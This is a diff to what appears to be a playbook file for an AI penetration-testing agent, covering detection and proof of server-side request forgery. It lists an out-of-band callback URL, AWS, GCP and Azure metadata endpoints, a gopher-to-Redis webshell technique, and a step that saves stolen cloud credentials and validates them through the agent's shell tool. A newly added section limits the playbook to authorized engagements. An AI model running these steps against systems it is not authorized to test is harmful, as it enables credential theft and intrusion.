@@ -4,15 +4,18 @@ description: "SSRF detection, internal access, and proof. Triggers - url/uri/cal
 tags: [vuln_assess, exploitation]
 ---
 
+## Rules of Engagement
+Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.
+
 # Server-Side Request Forgery (SSRF)
 
 ## When this fires
 The server makes an outbound request to a URL/host you can influence: webhook config, image/PDF/link-preview fetchers, import-from-URL, SSO/OIDC callback, image proxies (e.g. Next.js `/_next/image`), XML/SVG parsers.
 
 ## Detect
-Point it at an OOB listener; a callback from the SERVER's IP confirms SSRF:
+`oob` (action: url) returns a callback URL; a hit from the SERVER's IP confirms SSRF:
 ```bash
-# use interactsh / a collaborator / your own listener
+# oob action=url gives a callback URL, then oob action=poll
 url=http://<OOB-id>.oast.site   # then watch for the server-sourced hit
 ```
 Compare internal vs external: `http://127.0.0.1:<port>` / `http://localhost` responses vs a dead port (differential = internal reachability).
@@ -31,10 +34,10 @@ http://metadata.google.internal/computeMetadata/v1/  (Header Metadata-Flavor: Go
 http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Header Metadata:true)  # Azure
 # internal services: gopher:// to Redis (SLAVEOF/CONFIG SET dir → webshell), unauth admin panels, port-scan via response/timing
 ```
-**Proof required:** exfiltrated cloud creds/metadata, an internal-only page body, or an OOB hit provably from the server. Read creds → add_credential + cred_spray.
+**Proof required:** exfiltrated cloud creds/metadata, an internal-only page body, or an OOB hit provably from the server. Read creds → `state_update` (key: credentials); validate via `pentest_shell`.
 
 ## Tooling
-`nuclei -tags ssrf`; interactsh/collaborator for OOB; `gopherus` to craft gopher payloads.
+`nuclei -tags ssrf`; `oob` for OOB callbacks and polling; `gopherus` to craft gopher payloads.
 
 ## False positives / pitfalls
 - Client-side fetch (the BROWSER requests it) = not SSRF.
